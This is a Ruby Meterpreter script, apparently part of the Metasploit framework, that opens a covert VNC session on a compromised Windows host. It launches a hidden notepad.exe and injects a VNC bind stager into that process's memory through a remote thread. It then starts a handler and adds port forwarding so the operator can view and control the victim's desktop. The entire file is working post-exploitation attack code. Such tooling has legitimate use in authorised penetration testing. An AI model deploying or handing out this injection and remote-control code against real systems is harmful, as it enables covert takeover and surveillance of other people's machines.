# $Id$

#
# Meterpreter script for obtaining a quick VNC session
#

session = client

#
# Options
#
opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"],
	"-p"  => [ true,   "The port on the remote host to bind VNC to (default: randomized)"],
	"-l"  => [ true,   "The local port to listen on via port forwarding (default: 5901)"],
	"-e"  => [true,    "The process to run and inject into (default: notepad.exe)"]
)

#
# Default parameters
#

lport = 5901
lhost = "127.0.0.1"
rport = 1024 + rand(1024)
runme = "notepad.exe"

#
# Option parsing
#
opts.parse(args) do |opt, idx, val|
	case opt
	when "-h"
		print_line(opts.usage)
		return
	when "-p"
		rport = val.to_i
	when "-l"
		lport = val.to_i
	when "-e"
		runme = val
	end
end


#
# Create Payload
#
print_status("Creating a VNC stager: RHOST=#{lhost} LPORT=#{rport}")
pay = client.framework.payloads.create("windows/vncinject/bind_tcp")
pay.datastore['LPORT'] = rport
# pay.datastore['RHOST'] = vnc_lhost
raw  = pay.generate

#
# Create a host process
#
pid = client.sys.process.execute("#{runme}", nil, {'Hidden' => 'true'}).pid
print_status("Host process #{runme} has PID #{pid}")
note = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
mem  = note.memory.allocate(1024*32)

print_status("Allocated memory at address #{"0x%.8x" % mem}")
print_status("Writing the VNC stager into memory...")
note.memory.write(mem, raw)

#
# Setup the multi/handler
#

mul = session.framework.exploits.create("multi/handler")
mul.datastore['PAYLOAD']   = "windows/vncinject/bind_tcp"
mul.datastore['RHOST']    = lhost
mul.datastore['LPORT']    = lport
mul.datastore['EXITFUNC']  = 'process'
mul.datastore['ExitOnSession'] = true
print_status("Running Payload")
mul.exploit_simple(
	'Payload'        => mul.datastore['PAYLOAD'],
	'RunAsJob'       => true
)

print_status("Creating a new thread within #{runme} to run the VNC stager...")
note.thread.create(mem, 0)

print_status("Starting the port forwarding from #{lport} => TARGET:#{rport}")
client.run_cmd("portfwd add -l #{lport} -p #{rport} -r #{lhost}")
